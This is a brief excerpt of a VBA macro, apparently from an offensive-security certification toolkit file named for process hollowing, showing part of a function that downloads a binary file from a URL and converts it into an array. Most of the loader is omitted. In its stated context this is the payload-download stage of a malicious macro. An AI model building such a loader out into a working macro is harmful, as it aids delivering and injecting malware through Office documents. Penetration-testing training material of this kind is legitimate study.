' Source: https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/process_hollowing.vba
...
Function DownloadBinFileToArray(url As String) As Variant
    Dim http As Object
    ...
    If http.Status <> 200 Then
        Err.Raise vbObjectError + 1, , "Failed to download file. HTTP Status: " & http.Status
    End If
    
    ' Convert response to byte array
    response = http.responseBody
    
    ' Convert byte array to numeric array if needed
    ReDim result(UBound(response)) As Long
